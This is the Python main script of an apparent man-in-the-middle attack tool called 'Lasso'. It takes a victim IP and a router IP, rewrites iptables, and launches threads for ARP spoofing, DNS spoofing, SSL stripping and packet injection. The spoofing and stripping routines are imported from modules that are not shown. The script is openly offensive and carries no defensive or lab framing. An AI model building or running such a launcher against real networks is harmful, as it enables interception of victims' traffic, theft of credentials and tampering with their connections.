import argparse
import threading
from core.arp_spoof import start_arp_spoof
from core.dns_spoof import start_dns_spoof
from core.ssl_strip import start_ssl_strip
from core.packet_inject import start_packet_inject
from utils.iptables import configure_iptables, reset_iptables
from utils.logger import log

def main():
    parser = argparse.ArgumentParser(description="Lasso: MITM Attack Framework")
    parser.add_argument("-t", "--target", required=True, help="Target IP (Victim)")
    parser.add_argument("-r", "--router", required=True, help="Router IP (Gateway)")
    parser.add_argument("--dns", action="store_true", help="Enable DNS spoofing")
    parser.add_argument("--sslstrip", action="store_true", help="Enable SSL stripping")
    parser.add_argument("--inject", action="store_true", help="Enable packet injection")
    args = parser.parse_args()

    log("Configuring iptables...")
    configure_iptables()

    log("Starting ARP Spoofing...")
    arp_thread = threading.Thread(target=start_arp_spoof, args=(args.target, args.router))
    arp_thread.start()

    if args.dns:
        log("Starting DNS Spoofing...")
        dns_thread = threading.Thread(target=start_dns_spoof)
        dns_thread.start()

    if args.sslstrip:
        log("Starting SSL Stripping...")
        ssl_thread = threading.Thread(target=start_ssl_strip)
        ssl_thread.start()

    if args.inject:
        log("Starting Packet Injection...")
        inject_thread = threading.Thread(target=start_packet_inject)
        inject_thread.start()

    try:
        arp_thread.join()
    except KeyboardInterrupt:
        log("Stopping Lasso...")
        reset_iptables()

if __name__ == "__main__":
    main()
